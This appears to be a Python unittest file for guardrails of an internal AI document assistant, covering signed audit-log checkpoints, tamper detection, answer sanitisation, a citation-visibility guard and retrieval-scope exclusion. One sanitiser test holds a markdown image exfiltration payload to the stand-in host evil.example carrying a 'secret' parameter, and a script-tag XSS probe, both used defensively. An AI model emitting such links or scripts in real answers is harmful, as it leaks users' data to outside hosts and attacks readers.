"""Stage C guardrails: signed audit checkpoints, the AI retrieval scope, the
over-sharing scan, and answer sanitisation. No API calls.

Covers section 9 items 6 (checkpoints), 11 (sanitise), 12 (over-sharing + AI scope).

    python -m unittest discover tests
"""
import json
import os
import sys
import tempfile
import unittest

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
import authz
import guard
import oversharing
import sanitize
import simulate
from audit import AuditLog

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
STATE = os.path.join(ROOT, "state")


def _unlink(path):
    if os.path.exists(path):
        os.remove(path)


class SignedCheckpoints(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.log = AuditLog(os.path.join(self.tmp.name, "audit.jsonl"), key=b"test-key")

    def tearDown(self):
        self.tmp.cleanup()

    def _fill(self, n):
        for i in range(n):
            self.log.append({"event": "query", "user_id": "jdoe", "question": f"q{i}"})

    def test_intact_chain_and_checkpoint(self):
        self._fill(3)
        self.log.checkpoint()
        self.assertIsNone(self.log.verify())
        self.assertTrue(self.log.verify_detail()["ok"])

    def test_truncation_is_detected(self):
        self._fill(5)
        self.log.checkpoint()
        self.log.truncate(2)                      # drop the tail, checkpoints untouched
        detail = self.log.verify_detail()
        self.assertEqual((detail["ok"], detail["kind"]), (False, "truncation"))

    def test_checkpoint_signature_is_detected(self):
        self._fill(3)
        self.log.checkpoint()
        checkpoints = self.log.checkpoints()
        checkpoints[0]["sig"] = "0" * 64          # forge the signature
        with open(self.log.checkpoint_path, "w", encoding="utf-8") as f:
            f.write("\n".join(json.dumps(c, ensure_ascii=False) for c in checkpoints) + "\n")
        detail = self.log.verify_detail()
        self.assertEqual((detail["ok"], detail["kind"]), (False, "checkpoint"))

    def test_tampered_record_is_detected(self):
        self._fill(3)
        self.log.checkpoint()
        with open(self.log.path, encoding="utf-8") as f:
            lines = f.read().splitlines()
        record = json.loads(lines[1])
        record["question"] = "forged"
        lines[1] = json.dumps(record, ensure_ascii=False)
        with open(self.log.path, "w", encoding="utf-8") as f:
            f.write("\n".join(lines) + "\n")
        self.assertEqual(self.log.verify(), 2)


class SanitizeAnswer(unittest.TestCase):
    def test_exfiltration_attempt_is_stripped(self):
        out = sanitize.sanitize_answer(
            "![x](https://evil.example/?d=secret) see [here](https://evil.example/a) and https://evil.example/b")
        self.assertNotIn("evil.example", out)

    def test_lumenpay_url_survives(self):
        out = sanitize.sanitize_answer("See https://wiki.lumenpay.example/page for details.")
        self.assertIn("wiki.lumenpay.example", out)

    def test_html_is_escaped(self):
        out = sanitize.sanitize_answer("<script>alert(1)</script>")
        self.assertNotIn("<script>", out)


class AnswerGuard(unittest.TestCase):
    """The citation guard, including the audit-turn exception: a compliance answer is
    grounded in audit records, so it may carry no document citation — but every citation it
    does carry is still checked."""

    def test_an_answer_without_citations_is_rejected(self):
        ok, reason = guard.check("The migration is in progress.", [], "jdoe")
        self.assertFalse(ok)
        self.assertEqual(reason, "answer has no citations")

    def test_a_document_answer_must_cite_a_document_returned_this_turn(self):
        ok, reason = guard.check("The migration is in progress [E01].", [], "jdoe")
        self.assertFalse(ok)
        self.assertIn("not returned this turn", reason)
        ok, _ = guard.check("The migration is in progress [E01].", ["E01"], "jdoe")
        self.assertTrue(ok)

    def test_a_citation_the_user_cannot_see_is_rejected(self):
        ok, reason = guard.check("See [E09].", ["E09"], "jdoe")     # E09 is restricted
        self.assertFalse(ok)
        self.assertIn("cannot see", reason)

    def test_an_audit_answer_may_carry_no_document_citation(self):
        ok, reason = guard.check("2 records matched: jdoe opened E03 at 09:12.",
                                 [], "glim", tools_used={"query_audit"})
        self.assertTrue(ok, reason)

    def test_the_audit_exception_does_not_relax_the_visibility_rule(self):
        ok, reason = guard.check("jdoe opened [E09].", ["E09"], "glim", tools_used={"query_audit"})
        self.assertFalse(ok)
        self.assertIn("cannot see", reason)


class OversharingAndAiScope(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.TemporaryDirectory(ignore_cleanup_errors=True)
        self.addCleanup(lambda: (_unlink(os.path.join(STATE, "ai_scope.json")), authz.reload()))

    def test_oversharing_scan_flags_e21_for_a_contractor(self):
        findings = oversharing.scan()
        self.assertIn("E21", {f.doc_id for f in findings if f.rule == "R1"})
        finding = next(f for f in findings if f.doc_id == "E21")
        self.assertIn("atan", finding.external_readers)

    def test_excluded_location_hides_docs_from_the_tools(self):
        from agent import Session
        from llm import LLM
        from tools import make_tools
        simulate.exclude("gdrive:vendor-qa", audit_path=os.path.join(self.tmp.name, "audit.jsonl"))
        session = Session("jdoe", llm=LLM(model="fake"),
                          audit=AuditLog(os.path.join(self.tmp.name, "audit.jsonl")))
        _, call = make_tools(session)
        self.assertEqual(call("open_doc", {"doc_id": "E21"}), {"error": "not_found"})
        payload = call("search", {"query": "vendor qa test plan risk acceptance legacy TLS"})
        ids = {r["doc_id"] for r in payload["results"]}
        self.assertNotIn("E19", ids)
        self.assertNotIn("E21", ids)
        reasons = {d.get("reason") for r in session.audit.query(doc="E21", decision="deny")
                   for d in r.get("decisions", []) if d.get("doc_id") == "E21"}
        self.assertIn("ai_scope_excluded", reasons)


if __name__ == "__main__":
    unittest.main()
